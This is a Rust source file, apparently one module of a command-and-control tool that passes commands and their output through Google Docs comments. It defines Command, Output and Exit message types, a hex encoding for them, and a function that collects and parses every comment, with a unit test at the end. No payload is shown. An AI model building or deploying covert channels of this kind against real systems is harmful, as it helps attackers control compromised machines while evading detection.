use std::str::FromStr;

use crate::GoogleDocsC2;

#[repr(u8)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum MessageType {
    Command = 0x01,
    Output = 0x02,
    Exit = 0x03,
}

impl TryFrom<u8> for MessageType {
    type Error = ();

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        match value {
            0x01 => Ok(MessageType::Command),
            0x02 => Ok(MessageType::Output),
            0x03 => Ok(MessageType::Exit),
            _ => Err(()),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct Message {
    pub message_type: MessageType,
    pub message_id: [u8; 12],
    pub message: String,
}

impl ToString for Message {
    fn to_string(&self) -> String {
        format!(
            "{:02x}{}{}",
            self.message_type as u8,
            hex::encode(self.message_id),
            hex::encode(self.message.as_bytes())
        )
    }
}

impl FromStr for Message {
    type Err = Box<dyn std::error::Error>;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        let message_type = u8::from_str_radix(&s.get(0..2).ok_or("Message too short")?, 16)?;
        let message_id = hex::decode(&s.get(2..26).ok_or("Message too short")?)?;
        let message = hex::decode(&s.get(26..).ok_or("Message too short")?)?;
        Ok(Message {
            message_type: message_type
                .try_into()
                .map_err(|_| "Invalid message type")?,
            message_id: message_id.try_into().map_err(|_| "Invalid length")?,
            message: String::from_utf8(message)?,
        })
    }
}

pub async fn read_all_messages(
    c2: &GoogleDocsC2,
) -> Result<Vec<Message>, Box<dyn std::error::Error>> {
    let comments = c2.read_all_comments().await?;
    let mut messages = Vec::new();
    for comment in comments {
        if let Ok(msg) = comment.parse::<Message>() {
            messages.push(msg);
        }
    }
    Ok(messages)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_message_conversion() {
        let message = Message {
            message_type: MessageType::Command,
            message_id: [0x02; 12],
            message: "Hello, world!".to_string(),
        };
        assert_eq!(
            message.to_string(),
            "0102020202020202020202020248656c6c6f2c20776f726c6421"
        );

        assert_eq!(
            "0102020202020202020202020248656c6c6f2c20776f726c6421"
                .parse::<Message>()
                .unwrap(),
            message
        );
    }
}
